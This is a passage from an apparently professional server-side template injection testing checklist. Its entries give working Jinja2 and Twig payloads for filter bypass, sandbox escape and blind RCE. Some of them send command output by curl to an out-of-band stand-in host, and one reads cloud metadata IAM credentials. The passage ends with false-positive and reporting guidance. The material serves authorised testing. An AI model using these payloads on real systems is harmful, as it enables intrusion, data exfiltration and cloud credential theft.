**Test Steps:** 1. {{ blocked -&gt; statement context {%print(7*7)%}.<br>2. . blocked -&gt; |attr() or ['name']; _ blocked -&gt; \x5f/unicode.<br>3. Keyword/quote blocked -&gt; request.args smuggling: {{ lipsum|attr(request.args.g) }} with ?g=__globals__ (the bad word never appears in your injection).

**Expected Result:** The filtered token is delivered via request args / attr chains and the payload executes.

**Payload Example:**

```
{{ lipsum|attr(request.args.g) }}   with ?g=__globals__
{%print(7*7)%}
```

**Impact:** Defeats char/keyword WAFs; request-arg smuggling is the universal Jinja2 bypass.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-036 — Twig sandbox bypass
**Test Category:** Bypass — Sandbox · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Twig (PHP)

**Where to Test / Injection Point:** Twig sandbox restricting functions

**Test Steps:** 1. filter/sort/map('system') often slip older sandboxes.<br>2. attribute(_self.env,'getFilter',['system'])('id').<br>3. registerUndefinedFilterCallback then getFilter.

**Expected Result:** A sandboxed Twig instance still reaches system() via filter tricks.

**Payload Example:**

```
{{ ['id','']|sort('system') }}
{{ attribute(_self.env,'getFilter',['system'])('id') }}
```

**Impact:** Restores RCE against sandboxed Twig.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-037 — Blind SSTI — time-based confirmation
**Test Category:** Detection — Blind · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Template Engine:** Any (engine-specific)

**Where to Test / Injection Point:** Sink with no reflected output

**Test Steps:** 1. Run a sleep via the engine's exec: Jinja {{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}.<br>2. Compare sleep 10 vs sleep 0 timing, repeatably.<br>3. Then extract via OOB.

**Expected Result:** The response delays ~10s under the injected command, fast without it.

**Payload Example:**

```
{{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}
```

**Impact:** Confirms blind SSTI/RCE with no output channel.

**Tools:** Burp Repeater, tplmap

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-038 — Blind SSTI — OOB exfiltration
**Test Category:** Detection — Blind · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Any (engine-specific)

**Where to Test / Injection Point:** Blind sink; OOB channel available

**Test Steps:** 1. Exec a curl/nslookup carrying $(whoami) into the OOB hostname/path.<br>2. Jinja: {{ cycler.__init__.__globals__.os.popen('curl http://$COLLAB/$(whoami)').read() }}.<br>3. A hit from the SERVER IP confirms server-side eval; the subdomain carries the output.

**Expected Result:** An OOB callback arrives from the server carrying command output.

**Payload Example:**

```
{{ cycler.__init__.__globals__.os.popen('curl http://$COLLAB/$(whoami)').read() }}
<%= `curl http://$COLLAB/$(whoami)` %>
```

**Impact:** Proves blind RCE and exfiltrates output - Critical.

**Tools:** Burp Collaborator, interactsh

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; HackTricks SSTI

---

## SSTI-039 — SSTI -&gt; RCE -&gt; cloud metadata / secrets chain
**Test Category:** Impact — Post-Exploitation · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Template Engine:** Any (RCE-capable)

**Where to Test / Injection Point:** Confirmed SSTI RCE on a cloud host

**Test Steps:** 1. From RCE, curl the cloud metadata endpoint (169.254.169.254) for IAM creds.<br>2. Or read app config/.env for secrets.<br>3. Prove creds live (sts get-caller-identity) read-only, then STOP; hand off to the SSRF/cloud kit.

**Expected Result:** The RCE reads cloud metadata credentials or local secrets.

**Payload Example:**

```
{{ cycler.__init__.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}
```

**Impact:** SSTI -&gt; RCE -&gt; cloud account takeover - compound Critical, quantifies real blast radius.

**Tools:** Burp, aws-cli

**References:** CWE-1336; CWE-94; CWE-918; HackTricks SSTI

---

## SSTI-040 — False-positive filter (rule out CSTI / lone 7*7)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Template Engine:** Any

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject: a lone {{7*7}}=49 with no differential/engine/impact; client-side {{}} evaluated in the browser (Angular/Vue = CSTI/XSS); {{7*7}} reflected literally as 7*7; only a template error with no evaluation; 49 the page could already contain (use 1337*1338); 'tplmap said so' with no manual proof.<br>2. Require differential server-side eval + identified engine + impact.<br>3. File client-side {{}} as XSS, not SSTI.

**Expected Result:** A confirmed server-side-evaluated, engine-identified finding with impact - not CSTI or a reflection.

**Payload Example:**

```
differential {{1337*1338}}=1788906 + {{7*'7'}}=7777777 + engine + id output
```

**Impact:** Protects credibility; SSTI is frequently confused with CSTI/reflection.

**Tools:** Burp, manual

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-041 — Client-facing impact &amp; PoC package (CWE-1336/94)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Template Engine:** Any

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with RCE (or, if sandboxed, file-read/{{config}} secrets = High).<br>2. Provide the differential proof, engine, exact payload, and benign marker (id) output; redact secrets.<br>3. Set CVSS 3.1 + CWE-1336 (+ CWE-94). Remediation: never render user-controlled templates; use logic-less/sandboxed engines with a strict allowlist; pass user data as context variables, not template source.<br>4. De-dupe to one finding per sink; file client-side {{}} as XSS.

**Expected Result:** A reproducible, correctly-rated, benign PoC a client can validate and remediate.

**Payload Example:**

```
PoC: differential + engine + id output (redacted secrets) + CVSS + CWE-1336 + fix guidance.
```

**Impact:** Converts SSTI into a defensible Critical/High report with a clear fix.

**Tools:** Burp, CVSS calculator, SSTI_REPORT_TEMPLATE.md

**References:** CWE-1336; CWE-94; FIRST CVSS v3.1; PortSwigger Web Security Academy: Server-side template injection  |  TOP REFERENCES: James Kettle 'Server-Side Template Injection' (PortSwigger Research, BlackHat 2015); PortSwigger Academy; PayloadsAllTheThings; HackTricks

---
